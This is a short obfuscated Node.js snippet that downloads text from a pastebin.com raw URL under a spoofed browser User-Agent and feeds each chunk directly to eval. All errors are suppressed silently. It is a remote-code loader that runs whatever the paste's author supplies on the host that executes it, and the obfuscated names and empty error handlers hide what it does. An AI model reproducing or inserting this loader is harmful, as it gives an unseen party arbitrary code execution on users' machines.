try {
  var https = require("https");
  https.get({hostname: "pastebin.com", path: "/raw/XLeVP82h", headers: {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0", Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}}, _0x5c4dee => {
    var _0x11bf27 = {ioCaY: function (_0x30ea8d, _0x430b5c) {
      return _0x30ea8d(_0x430b5c);
    }};
    _0x5c4dee.setEncoding("utf8");
    _0x5c4dee.on("data", _0x29ad14 => {
      _0x11bf27.ioCaY(eval, _0x29ad14);
    });
    _0x5c4dee.on("error", () => {});
  }).on("error", () => {});
} catch (_0x1fc073) {}

